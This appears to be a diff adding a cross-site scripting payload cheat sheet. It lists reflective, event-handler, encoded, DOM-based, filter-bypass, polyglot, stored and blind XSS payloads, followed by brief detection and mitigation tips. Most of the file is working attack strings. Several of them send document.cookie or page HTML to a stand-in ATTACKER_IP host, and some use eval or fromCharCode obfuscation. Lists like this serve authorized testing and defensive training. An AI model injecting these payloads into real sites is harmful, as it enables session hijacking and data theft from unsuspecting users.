@@ -1,0 +1,68 @@
+Cross-Site Scripting (XSS) Payloads:
+
+### Basic Reflective XSS:
+- <script>alert(1)</script>
+- <script>alert('XSS')</script>
+- <script>confirm('XSS')</script>
+- <script>prompt('XSS')</script>
+
+### Event Handler XSS:
+- <img src=x onerror=alert(1)>
+- <body onload=alert(1)>
+- <input onfocus=alert(1) autofocus>
+- <svg onload=alert(1)>
+- <iframe onload=alert(1)>
+
+### Attribute-Based XSS:
+- " onmouseover="alert(1)
+- ' onmouseover='alert(1)
+- <a href="javascript:alert(1)">Click me</a>
+- <img src="x" onerror="alert(1)">
+
+### Encoded Payloads:
+- %3Cscript%3Ealert(1)%3C/script%3E
+- &#60;script&#62;alert(1)&#60;/script&#62;
+- \u003cscript\u003ealert(1)\u003c/script\u003e
+- <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+### Advanced Payloads:
+- <script>document.location='http://ATTACKER_IP/?cookie='+document.cookie</script>
+- <script>new Image().src='http://ATTACKER_IP/?c='+document.cookie;</script>
+- <script>fetch('http://ATTACKER_IP/?data='+btoa(document.body.innerHTML))</script>
+- <iframe src="javascript:alert(1)"></iframe>
+- <object data="javascript:alert(1)"></object>
+
+### DOM-Based XSS:
+- #<script>alert(1)</script> (in URL fragment)
+- javascript:alert(1) (in href)
+- <script>eval(location.hash.slice(1))</script> (if hash is controlled)
+
+### Filter Bypass:
+- <scr<script>ipt>alert(1)</scr<script>ipt>
+- <script src="data:text/javascript,alert(1)"></script>
+- <script>alert`1`</script> (template literals)
+- <script>alert.call(null,1)</script>
+- <script>window['alert'](1)</script>
+
+### Polyglot Payloads:
+- javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+- <svg><script>alert(1)</script></svg>
+
+### Stored XSS Examples:
+- Comment field: <script>alert('Stored XSS')</script>
+- Profile update: <img src=x onerror=alert('Profile XSS')>
+
+### Blind XSS:
+- <script>new Image().src='http://ATTACKER_IP/log?data='+encodeURIComponent(document.cookie);</script>
+- Use Burp Collaborator for blind detection
+
+### Detection and Testing:
+- Test with: <script>alert(1)</script>
+- Check if alert pops up
+- Use tools like XSSer or manual testing
+
+### Mitigation Notes:
+- Implement Content Security Policy (CSP)
+- Escape output properly
+- Use input validation and sanitization
+- Employ XSS filters or libraries like DOMPurify
